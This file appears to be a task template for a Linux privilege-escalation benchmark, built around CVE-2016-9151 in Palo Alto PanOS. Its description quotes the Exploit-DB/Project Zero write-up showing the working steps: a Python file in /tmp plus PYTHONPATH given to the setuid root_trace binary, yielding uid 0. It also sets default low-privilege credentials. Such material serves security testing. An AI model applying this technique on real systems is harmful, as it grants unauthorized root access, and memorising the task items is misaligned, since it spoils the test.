@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40788",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Palo Alto Networks PanOS - 'root_trace' Local Privilege Escalation (CVE-2016-9151)\n\nExploit source code (40788.txt):\n```\nSource: https://bugs.chromium.org/p/project-zero/issues/detail?id=912\n\nThe setuid root executable /usr/local/bin/root_trace essentially just does setuid(0) then system(\"/usr/local/bin/masterd\"), which is a python script:\n\n$ ls -l /usr/local/bin/root_trace\n-rwsr-xr-x 1 root root 12376 Oct 17  2014 /usr/local/bin/root_trace\n\nAs the environment is not scrubbed, you can just do something like this:\n\n$ cat /tmp/sysd.py\nimport os\nos.system(\"id\")\nos._exit(0);\n\n$ PYTHONPATH=/tmp root_trace\nuid=0(root) gid=502(admin) groups=501(noradgrp),502(admin)\n\nThis was fixed by PAN:\n\nhttp://securityadvisories.paloaltonetworks.com/Home/Detail/67\n```",
+  "cve": "CVE-2016-9151",
+  "exploitdb_id": "40788",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40788",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
